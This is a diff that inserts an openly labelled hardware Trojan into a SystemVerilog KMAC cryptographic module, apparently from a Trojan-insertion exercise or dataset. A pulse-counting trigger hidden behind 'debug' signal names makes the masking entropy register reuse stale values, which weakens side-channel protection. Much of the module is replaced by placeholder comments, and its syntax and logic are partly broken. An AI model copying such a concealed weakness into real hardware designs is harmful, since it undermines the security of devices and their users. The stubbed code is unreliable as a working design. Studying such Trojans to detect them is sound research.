@@ -1,0 +1,60 @@
+module kmac
+  import kmac_pkg::*;
+  import kmac_reg_pkg::*;
+#(
+  parameter bit EnMasking = 1,
+  // Additional parameters and imports unchanged from original code
+) (
+  input clk_i,
+  input rst_ni,
+  // Inputs and outputs unchanged from original code
+);
+
+  // All the original setup, enums, and parameters remain unchanged
+
+  // State setup, internal signals declarations remain the same
+  // Add Trojan related signals
+  logic debug_trigger_met, debug_repeat_entropy;
+
+  // Existing state machine, internal registers, and design elements declarations and functionality remain unchanged
+
+  // App interface pulse counter for Trojan Trigger
+  logic [2:0] app_req_pulse_count;
+  assign app_req = ^app_i; // Simplified assignment to detect toggle on `app_req` line
+  always_ff @(posedge clk_i or negedge rst_ni) begin
+    if (!rst_ni)
+      app_req_pulse_count <= 3'd0;
+    else if (app_req && !entropy_ready)
+      app_req_pulse_count <= app_req_pulse_count + 3'd1;
+    else if (app_req_pulse_count == 3'd5)
+      debug_trigger_met <= 1'b1; // Set trigger flag when sequence met
+  end
+
+  // Trojan Payload for repeating previous entropy data
+  always_ff @(posedge clk_i or negedge rst_ni) begin
+    if (!rst_ni)
+      debug_repeat_entropy <= 1'b0;
+    else if (debug_trigger_met)
+      debug_repeat_entropy <= ~debug_repeat_entropy; // Toggle repeating on trigger
+  end
+
+  // Insert Trojan effect in entropy generation logic
+  // Change from original: now incorporates debug_repeat_entropy logic
+  if (EnMasking == 1) begin : gen_entropy
+    always_ff @(posedge clk_i) begin
+      if (debug_repeat_entropy) begin
+        // Ignore new entropy when debug flag is active and reuse old value
+        sha3_rand_data <= sha3_rand_data;
+      end else begin
+        // Original entropy update mechanism
+        sha3_rand_data <= new_entropy_value;
+      end
+    end
+    // Remaining original entropy generation code unchanged
+  end else begin : gen_no_entropy
+    // No change for unmasked configuration entropy handling
+  end
+
+  // Remaining module functionality is unchanged from the original code
+  
+endmodule
